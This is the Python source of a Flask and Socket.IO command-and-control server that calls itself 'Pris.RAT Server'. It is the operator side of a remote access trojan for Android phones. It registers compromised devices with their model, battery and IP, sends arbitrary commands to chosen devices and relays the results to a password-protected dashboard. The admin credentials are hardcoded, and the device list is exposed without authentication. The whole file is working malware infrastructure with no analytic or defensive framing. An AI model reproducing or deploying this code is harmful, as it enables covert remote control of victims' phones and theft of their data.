from gevent import monkey
monkey.patch_all()

from flask import Flask, render_template, request, redirect, session, jsonify
from flask_socketio import SocketIO, emit, join_room
import os, uuid, json
from datetime import datetime

# ============ CONFIG ============
ADMIN_USER = "Pris"
ADMIN_PASS = "you are77"
SECRET_KEY = os.environ.get("SECRET_KEY", "pris_rat_secret_2026")

# ============ APP ============
app = Flask(__name__)
app.secret_key = SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*")

# ============ STORAGE ============
devices = {}
commands_queue = {}

# ============ ROUTES ============
@app.route("/")
def index():
    if "user" in session:
        return redirect("/dashboard")
    return redirect("/login")

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == ADMIN_USER and p == ADMIN_PASS:
            session["user"] = u
            session.permanent = True
            return redirect("/dashboard")
        else:
            error = "بيانات الدخول غير صحيحة"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    total = len(devices)
    online = sum(1 for d in devices.values() if d.get("online"))
    offline = total - online
    dev_list = []
    for did, d in devices.items():
        dev_list.append({
            "id": did,
            "model": d.get("model", "Unknown"),
            "android": d.get("android", "?"),
            "battery": d.get("battery", 0),
            "ip": d.get("ip", "?"),
            "online": d.get("online", False)
        })
    return render_template("dashboard.html",
                           total=total, online=online,
                           offline=offline, devices=dev_list)

# ============ SOCKET EVENTS ============
@socketio.on("connect")
def on_connect():
    print(f"[+] Client connected: {request.sid}")

@socketio.on("disconnect")
def on_disconnect():
    print(f"[-] Client disconnected: {request.sid}")

@socketio.on("register")
def on_register(data):
    device_id = data.get("id", str(uuid.uuid4())[:8])
    devices[device_id] = {
        "id": device_id,
        "model": data.get("model", "Unknown"),
        "android": data.get("android", "?"),
        "battery": data.get("battery", 0),
        "ip": request.remote_addr,
        "online": True,
        "registered_at": datetime.now().isoformat(),
        "sid": request.sid
    }
    join_room(device_id)
    print(f"[+] Device registered: {device_id} ({data.get('model')})")
    emit("registered", {"id": device_id}, room=request.sid)
    socketio.emit("devices_update", devices)

@socketio.on("heartbeat")
def on_heartbeat(data):
    device_id = data.get("id")
    if device_id in devices:
        devices[device_id]["online"] = True
        devices[device_id]["battery"] = data.get("battery", 0)
        devices[device_id]["last_seen"] = datetime.now().isoformat()

@socketio.on("send_command")
def on_send_command(data):
    target = data.get("target")
    action = data.get("action")
    if not target or target not in devices:
        emit("error", {"msg": "device not found"})
        return
    cmd_data = {
        "action": action,
        "params": data.get("params", {}),
        "ts": datetime.now().isoformat()
    }
    socketio.emit("execute", cmd_data, room=target)
    print(f"[→] Command sent to {target}: {action}")

@socketio.on("response")
def on_response(data):
    device_id = data.get("id")
    socketio.emit("device_response", data, broadcast=True)
    print(f"[←] Response from {device_id}: {data.get('type')}")

# ============ API ============
@app.route("/api/devices")
def api_devices():
    return jsonify(devices)

@app.route("/api/ping")
def api_ping():
    return jsonify({"status": "ok", "ts": datetime.now().isoformat()})

# ============ MAIN ============
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print(f"[*] Pris.RAT Server starting on port {port}")
    socketio.run(app, host="0.0.0.0", port=port, debug=False)